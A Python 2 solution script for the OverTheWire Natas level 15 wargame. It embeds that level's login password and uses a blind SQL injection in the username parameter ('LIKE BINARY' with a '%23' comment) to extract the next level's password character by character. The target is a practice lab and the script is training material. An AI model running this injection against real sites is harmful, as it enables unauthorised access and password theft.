import requests

accound = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
login = accound+':'+password+'@'

protocol = 'http://'
URL = 'natas15.natas.labs.overthewire.org/'

target = protocol+login+URL

allchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

r = requests.get(target)

if r.status_code == requests.codes.ok:
	print 'OK'

existUsr = 'This user exists.'
used = ''

for c in allchars :
	r = requests.get(target+'?username=natas16\" AND password LIKE BINARY \"%'+c+'%\" %23')
	if r.status_code != requests.codes.ok :
		print "ERROR"
		break

	if r.content.find(existUsr) != -1:
		used += c
		print "Used Characters :" + used

password = ''

while password.__len__() < 32 :
	for c in used :
		tmp = password + c
		r = requests.get(target+'?username=natas16\" AND password LIKE BINARY \"'+tmp+'%\" \"')
		if r.content.find(existUsr) != -1:
			password += c
			print "current password : " + password + '?' * (32 - password.__len__())
			break

print "END ~~"
